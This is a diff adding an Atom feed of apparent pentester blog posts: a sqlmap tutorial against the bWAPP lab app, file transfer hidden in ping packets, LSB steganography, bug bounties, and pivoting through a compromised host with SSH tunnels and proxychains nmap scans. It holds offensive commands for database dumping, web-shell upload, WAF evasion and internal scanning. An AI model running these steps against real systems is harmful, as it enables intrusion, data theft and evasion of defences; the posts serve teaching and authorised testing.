+    &lt;p&gt;Written in Python by &lt;a href=&quot;https://twitter.com/stamparm&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Miroslav Stamper&lt;/a&gt;, Sqlmap is probably the best automated tool to detect and exploit SQL Injection.&lt;/p&gt;
+
+&lt;p&gt;Sqlmap fully supports many databases as MySQL, Microsoft SQL Server, PostgreSQL, Oracle (and many more) and is able to detect the following injection types : 
+Boolean based blind, Error based, Union based, Stacked queries, Time based blind, Inline queries. Depending of the target status, sqlmap is also able to :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;prompt an interactive sql shell&lt;/li&gt;
+  &lt;li&gt;download/upload files&lt;/li&gt;
+  &lt;li&gt;prompt a web shell&lt;/li&gt;
+  &lt;li&gt;crack hashed password using a dictionnary attack&lt;/li&gt;
+  &lt;li&gt;and a lot more…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Below some examples of the main functions using &lt;a href=&quot;/an-extremely-buggy-web-app/&quot;&gt;bWAPP&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic usage&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-basic-usage.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-basic-usage.png&quot; alt=&quot;sqlmap basic usage&quot; style=&quot;float:left;margin-right:10px;&quot; width=&quot;300&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;In this example sqlmap has detected that the GET parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;title&lt;/code&gt; of the search function is vulnerable to sql injection. 
+Well done! Plus it found that 4 different types of injection can be used for exploitation. 
+Note that sqlmap has also detected that the parameter is vulnerable to XSS attacks which is unfortunatly very common these days…&lt;/p&gt;
+
+&lt;p&gt;To perform test on POST field you should write: &lt;code class=&quot;highlighter-rouge&quot;&gt;--data=&quot;title=sqlitest&amp;amp;action=search&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In the next example, I’ll turn off the verbose mode.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;information-gathering&quot;&gt;Information gathering&lt;/h2&gt;
+
+&lt;p&gt;Who am I ? Where am I ? What can I do ? Once you found an injection point, the next step is to gather as much information as possible about the running environment. 
+ This task is very easy with sqlmap which provides a great list of options.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--hostname&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-hostname.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-hostname.png&quot; alt=&quot;sqlmap hostname&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--current-user&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-current-user.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-current-user.png&quot; alt=&quot;sqlmap current user&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--privileges&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-privileges.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-privileges.png&quot; alt=&quot;sqlmap privileges&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And many more… All collected informations are stored in log files in the &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.sqlmap&lt;/code&gt; directory. 
+To get fresh results ignoring the results previously recorded you’ll then have to use &lt;code class=&quot;highlighter-rouge&quot;&gt;--fresh-queries&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;--flush-session&lt;/code&gt; or simply remove the corresponding directory.&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;The next step of the exploitation is to enumerate available databases, tables and columns. Again this is pretty simple with sqlmap.&lt;/p&gt;
+
+&lt;p&gt;Databases: &lt;code class=&quot;highlighter-rouge&quot;&gt;--dbs&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-databases.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-databases.png&quot; alt=&quot;sqlmap databases&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Tables: &lt;code class=&quot;highlighter-rouge&quot;&gt;-D bwapp --tables&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-tables.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-tables.png&quot; alt=&quot;sqlmap tables&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Columns: &lt;code class=&quot;highlighter-rouge&quot;&gt;-D bwapp -T users --columns&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-columns.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-columns.png&quot; alt=&quot;sqlmap columns&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Check the official documentation to see the list of all available options.&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-datas&quot;&gt;Getting datas&lt;/h2&gt;
+
+&lt;p&gt;Now you know the structure of the tables, you can grab all datas you want. To perform that task, I like to use the interactive sql prompt:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-datas.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-datas.png&quot; alt=&quot;sqlmap datas&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You can also dump a table or a database with the option &lt;code class=&quot;highlighter-rouge&quot;&gt;--dump&lt;/code&gt; on the command line. If sqlmap detects hashed strings, it will ask you to crack them or not via a dictionnary based attack.
+ The default wordlist is +1M length, it’s up you to fill it or provide your own list.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-crack.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-crack.png&quot; alt=&quot;sqlmap crack&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;manage-files&quot;&gt;Manage files&lt;/h2&gt;
+
+&lt;p&gt;Depending of the sql user privileges , the injection type and the filesystem permissions, you maybe could be able to play with the server.&lt;/p&gt;
+
+&lt;p&gt;Read file:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-file-read.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-file-read.png&quot; alt=&quot;sqlmap file read&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Write file:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/sqlmap-file-write.png&quot;&gt;&lt;img src=&quot;/images/sqlmap-file-write.png&quot; alt=&quot;sqlmap file write&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The option &lt;code class=&quot;highlighter-rouge&quot;&gt;--os-shell&lt;/code&gt; allows you to upload an ASP/JSP/PHP script on the remote server which will render an upload form. 
+Then you’ll use it to upload whatever file you want, usually a backdoor to perform a POC for your client.&lt;/p&gt;
+
+&lt;h2 id=&quot;usefull&quot;&gt;Usefull&lt;/h2&gt;
+
+&lt;p&gt;Below my favorite options of sqlmap, the ones I always use in all pentest.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--threads=10&lt;/code&gt; : to speed up sqlmap&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--tor --tor-type=socks5&lt;/code&gt; : to anonymize the traffic, must be used carefully while performing time based tests&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;--random-agent&lt;/code&gt; : a different User-Agent for each session&lt;/p&gt;
+
+&lt;p&gt;In this time where security is the heart of our job, day after day more and more network admins like to implements WAF, IPS or IDS. 
+Sqlmap has an option to bypass basic configuration of those systems: &lt;code class=&quot;highlighter-rouge&quot;&gt;--tamper&lt;/code&gt; allows you to trick the requests by applying a filter on the SQL string like random case.&lt;/p&gt;
+
+&lt;h2 id=&quot;going-further&quot;&gt;Going further&lt;/h2&gt;
+
+&lt;p&gt;Sqlmap is a very very powerful tool. After months I still don’t know all options but here are some extra functionnalities who look interesting:&lt;/p&gt;
+
+&lt;p&gt;Interaction with Metasploit framework&lt;/p&gt;
+
+&lt;p&gt;Smartphone impersonation&lt;/p&gt;
+
+&lt;p&gt;Website crawling&lt;/p&gt;
+
+&lt;p&gt;Windows registry access&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/sqlmap/&quot;&gt;Sqlmap&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on January 18, 2016.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[File transfer with ping]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/file-transfer-with-ping/" />
+  <id>http://10degres.net/file-transfer-with-ping</id>
+  <published>2015-10-26T00:00:00+00:00</published>
+  <updated>2015-10-26T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Anyone who ever deals with server managment knows the famous &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; utility. 
+Ping send &lt;strong&gt;ICMP request&lt;/strong&gt; to a remote host, it’s commonly used to test if a server is alive or to know his ip address. 
+However ping options allow us to customize this requests in some way, then it becomes possible to transfer any type of data. 
+For the purpose I test my script with different media types like png or mp3 and it worked perfectly.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-idea&quot;&gt;The idea&lt;/h2&gt;
+
+&lt;p&gt;By default ping requests are formed with 98 bytes including 56 bytes of data and various headers. 
+With the &lt;code class=&quot;highlighter-rouge&quot;&gt;-p&lt;/code&gt; option, ping allows you to customize 16 of those 56 bytes:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/ping_test.png&quot;&gt;&lt;img src=&quot;/images/ping_test.png&quot; alt=&quot;ping test&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Here is the request catched with &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; on the remote host:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/ping-capture.png&quot;&gt;&lt;img src=&quot;/images/ping-capture.png&quot; alt=&quot;ping capture&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see the submitted string repeats again and again until the end of the data request.
+If you provide a string longer than 16 bytes it will be truncated. From here, we can &lt;strong&gt;convert any data to hexa and send it through ping request&lt;/strong&gt;.
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-poc&quot;&gt;The POC&lt;/h2&gt;
+
+&lt;p&gt;For my tests I used the following Anonymous image:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/anonymous.jpg&quot;&gt;&lt;img src=&quot;/images/anonymous.jpg&quot; alt=&quot;anonymous&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This image is about 7Ko so the script sent near 1200 ping requests, which is alot… It’s also time consuming but to be honest it’s so fun :) Below the poc:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/icmp-transfer-poc.png&quot;&gt;&lt;img src=&quot;/images/icmp-transfer-poc.png&quot; alt=&quot;icmp transfer poc&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/icmp-transfer-capture.png&quot;&gt;&lt;img src=&quot;/images/icmp-transfer-capture.png&quot; alt=&quot;icmp transfer capture&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: the script also works if echo request has been disable on the remote host (with &lt;code class=&quot;highlighter-rouge&quot;&gt;icmp_echo_ignore_all&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;), 
+but slower. Feel free to mail me if you want to take a look at the scripts.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/file-transfer-with-ping/&quot;&gt;File transfer with ping&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on October 26, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Steganography]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/steganography/" />
+  <id>http://10degres.net/steganography</id>
+  <published>2015-10-18T00:00:00+01:00</published>
+  <updated>2015-10-18T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;definition&quot;&gt;Definition&lt;/h2&gt;
+
+&lt;p&gt;Steganography is the art of hidding a message in another common message. 
+The hidden message can be clear text or encrypted and the container can be anything: image, music, single text or whatever… 
+The main benefit of steganography is that you can get the final message only if you know the technic used to hide it, because you’ll need to use the same algorithm. 
+As a second layer of protection, you can also encrypt the data with any algorithm you like or with a private key.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;example&quot;&gt;Example&lt;/h2&gt;
+
+&lt;p&gt;A good old example of steganography is the famous letter of Georges Sand to Alfred de Musset. 
+The original text looks like a lovely letter but you only read even lines, a porn text appears (see &lt;a href=&quot;http://5ko.free.fr/fr/sand.html&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;this link&lt;/a&gt; (FR)). 
+If you don’t know that you won’t be able to see how Georges Sand was horny :)&lt;/p&gt;
+
+&lt;h2 id=&quot;least-significant-bit&quot;&gt;Least Significant Bit&lt;/h2&gt;
+
+&lt;p&gt;Our days, with new technologies, the container can be a media support: image (jpg, gif, bmp…), video (avi, mov, flv…), sound (wav, ogg…). 
+Let’s see how it works with a basic technic, called Least Significant Bit aka LSB, on a png image. 
+This is probably one of the easiest technic to hide a message inside an image using steganogaphy.&lt;/p&gt;
+
+&lt;p&gt;Each pixel of an image is made of 3 components: Red, Green, Blue. Each component can have a value from 0 to 255, so the total available colors is about &lt;code class=&quot;highlighter-rouge&quot;&gt;256*256*256=16777216&lt;/code&gt;. 
+Obviously the human eye cannot see all of those shades. 
+Each RGB component is encoded on 8 bits (2^8), that means we can use the “least significant bit” aka 2^0=1 as a flag to hide any characters. 
+Who will notice the difference between a full black pixel with R=0, G=0, B=0 and another pixel with R=1, G=1, B=1 ? No one for sure…&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/lsb-black-000000.png&quot;&gt;&lt;img src=&quot;/images/lsb-black-000000.png&quot; alt=&quot;lsb black 000000&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;/images/lsb-black-010101.png&quot;&gt;&lt;img src=&quot;/images/lsb-black-010101.png&quot; alt=&quot;lsb black 010101&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Do you see the difference ? Of course not. Do you get the point now ?&lt;/p&gt;
+
+&lt;h2 id=&quot;real-case&quot;&gt;Real case&lt;/h2&gt;
+
+&lt;p&gt;Based on this technic, I wrote a little PHP script to put a secret message inside a png picture then I wrote another script for extraction:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/lsb-mountain-message.png&quot;&gt;&lt;img src=&quot;/images/lsb-mountain-message.png&quot; alt=&quot;lsb mountain with message&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;/images/lsb-mountain-empty.png&quot;&gt;&lt;img src=&quot;/images/lsb-mountain-empty.png&quot; alt=&quot;lsb mountain original&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The picture with the encoded message is the left one, obviously you cannot see the difference without an image editor, here is the extracted data:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UXVlIGRldmllbnQgbGEgdmVydHUgcGVuZGFudCBjZXMgZMOpbGljaWV1eCB2b3lhZ2VzIG91IGxhIHBlbnPDqWU
+gZnJhbmNoaXQgdG91cyBsZXMgb2JzdGFjbGVzID8=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After a base64 decode, a text from Honoré De Balzac, a famous french writer, appears:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Que devient la vertu pendant ces délicieux voyages ou la pensée franchit tous les obstacles ?&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In this test I only used the red component to store my message, that means I can only encode one bit of one character in one pixel. 
+Since a character is encoded on 8 bits, the string max length is:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;(img_width*img_height) / 8&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Of course everything is possible to raise the max length, you can use the green and the blue components, you also use the second least significant bit and third, 
+compress your data or you can simply use a bigger picture :) The only thing you have to matter is that the more text you’ll add, the more it will alter the original picture.&lt;/p&gt;
+
+&lt;h2 id=&quot;forfun&quot;&gt;For fun&lt;/h2&gt;
+
+&lt;p&gt;I improved my script to support every filetype in input. 
+In the following picture I decide to hide a mp3 sound, there is no way to figure out the tricks:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/lsb-dbz-message.png&quot;&gt;&lt;img src=&quot;/images/lsb-dbz-message.png&quot; alt=&quot;lsb dbz with audio&quot; /&gt;&lt;/a&gt;
+&lt;a href=&quot;/images/lsb-dbz-empty.png&quot;&gt;&lt;img src=&quot;/images/lsb-dbz-empty.png&quot; alt=&quot;lsb dbz original&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;audio src=&quot;/images/lsb_dbz.mp3&quot; controls=&quot;controls&quot;&gt;&lt;/audio&gt;
+
+&lt;p&gt;In this test I used the three color components because of the size of the audio which was about 500Ko, the original picture was about 2Mo. 
+Finally, after the merge, the final picture is logically, about 2.5Mo.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/steganography/&quot;&gt;Steganography&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on October 18, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Bug Bounty Programs]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/bug-bounty-programs/" />
+  <id>http://10degres.net/bug-bounty-programs</id>
+  <published>2015-10-08T00:00:00+01:00</published>
+  <updated>2015-10-08T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;With the evolution of cybercrime this last years, security is became an important budget in large companies. 
+For instance, &lt;a href=&quot;https://www.facebook.com/whitehat/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Facebook&lt;/a&gt; has created a dedicated platform for security reseacher and frequently reward them ($1.3 million spent in 2014).&lt;/p&gt;
+
+&lt;p&gt;Ebay, Airbnb, Yahoo, Snapchat, Wordpress, all of these companies are now aware about security and all of them have subscribed a bug bounty program. 
+Even mobile plateform as Android and IOS apps are recently focused by the giant Google.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Do you think you are safe because you are not one of those giant ? Wrong, everyone has to feel concerned, from big companies to small business, hackers are everywhere. 
+Even a small blog can be targeted, even if you haven’t dozen of datas, credit card or money, your site can be used to perform anonymous attacks, your server can host dangerous files or whatever…&lt;/p&gt;
+
+&lt;p&gt;Don’t be shy and subscribe ! Everyone can create his own bug bounty program on specific sites like &lt;a href=&quot;https://hackerone.com/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;HackerOne&lt;/a&gt; or &lt;a href=&quot;https://bugcrowd.com/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Bugcrowd&lt;/a&gt;, 
+you simply need to define the perimeter of the tests, allowed attacks and elligible vulnerabilities. 
+Depending of your current security level, the researchers can contact you very quickly. 
+From kudos to thousands dollars, rewards varies depending of the type of the vulnerabilitie found, the impact it can have (on you, your clients and visitors) and your founds…&lt;/p&gt;
+
+&lt;p&gt;With that kind of solution your platform will be better day by day, improving her quality and security. Of course that does not mean that you don’t need to work by yourself on your own project. 
+Code review and tests must be still performed.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/bug-bounty-programs/&quot;&gt;Bug Bounty Programs&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on October 08, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Port forwarding and tunneling]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/port-forwarding-and-tunneling/" />
+  <id>http://10degres.net/port-forwarding-and-tunneling</id>
+  <published>2015-09-17T00:00:00+01:00</published>
+  <updated>2015-09-17T00:00:00+01:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;As a pentester, you might be able to take control of systems that have a direct access but you also might be able to test the internal network and check the machine who are inside a subnetwork.&lt;/p&gt;
+
+&lt;p&gt;For that task you’ll have to use an already compromised machine as a bridge/gateway, this technic is called “pivot”. 
+Depending of the context, different solutions exist to perform that task.&lt;/p&gt;
+
+&lt;h2 id=&quot;rinetd&quot;&gt;Rinetd&lt;/h2&gt;
+
+&lt;p&gt;The easiest one. First you need to install Rinetd:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aptitude search rinetd
+p   rinetd                                     - Internet TCP redirection server&amp;lt;/pre&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then edit the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/rinetd.conf&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# bindadress    bindport  connectaddress  connectport
+192.168.0.10    80        91.121.139.22   8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Restart Rinetd and from now, all incoming traffic on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.10&lt;/code&gt; on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; will be redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;91.121.139.22&lt;/code&gt; on port &lt;code class=&quot;highlighter-rouge&quot;&gt;8080&lt;/code&gt;. 
+This can be usefull if a firewall is restricting outbound traffic on certain port.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;ssh&quot;&gt;SSH&lt;/h2&gt;
+
+&lt;h3 id=&quot;local-port-forwarding&quot;&gt;Local port forwarding&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L &amp;lt;local port to listen&amp;gt;:&amp;lt;remote host&amp;gt;:&amp;lt;remote port&amp;gt; &amp;lt;gateway&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Similar to port forwarding with Rinetd, this technic still have some tints. The traffic is encrypted but only between the local machine and the gateway. 
+If the remote host is &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; then it refers to the gateway. Example:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 8080:192.168.1.25:80 bob@192.168.0.10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This open a tunnel between the local machine on port &lt;code class=&quot;highlighter-rouge&quot;&gt;8080&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.25&lt;/code&gt; on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; trough the ssh server &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.10&lt;/code&gt; connected with user &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;. 
+Connexion from other machines are not accepted by default, to enable this feature you have to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;-g&lt;/code&gt; option.&lt;/p&gt;
+
+&lt;h3 id=&quot;remote-port-forwarding&quot;&gt;Remote port forwarding&lt;/h3&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -R &amp;lt;remote port to bind&amp;gt;:&amp;lt;local host&amp;gt;:&amp;lt;local port&amp;gt; &amp;lt;gateway&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Note that this must be launched on the already compromised machine ! In this case if the local host is &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; then it refers to the local machine. Example:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -R 1234:192.168.1.25:80 bob@192.168.0.10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This pop a reverse shell on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.0.10&lt;/code&gt; connected with user &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt; and create a tunnel on port &lt;code class=&quot;highlighter-rouge&quot;&gt;1234&lt;/code&gt; wich will receive all traffic from &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.25&lt;/code&gt; on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;proxychains&quot;&gt;ProxyChains&lt;/h2&gt;
+
+&lt;p&gt;As a standalone, Proxychains is mainly used to anonymize traffic but combined with SSH it can be used to perform dynamic port forwarding.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ aptitude search proxychains
+p   libproxychains-dev                - proxy chains -- shared library (development)
+p   libproxychains3                   - proxy chains -- shared library (runtime)
+p   proxychains                       - proxy chains - redirect connections through proxy servers&amp;lt;/pre&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;When the install is finished, edit &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt; as here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &quot;tor&quot;
+socks4  127.0.0.1 9050
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Then we can create a tunnel wich will forward all incoming traffic to any host in the internal network trough the compromised machine which runs the ssh server. Syntax:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -D &amp;lt;local proxy&amp;gt; &amp;lt;target&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh -D 127.0.0.1:9050 bob@192.168.0.10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;From now we can perform scans or anything else on every port on every machine in the DMZ with Proxychains:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ proxychains nmap -p 139,445 192.168.1.100-200
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/port-forwarding-and-tunneling/&quot;&gt;Port forwarding and tunneling&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on September 17, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+</feed>
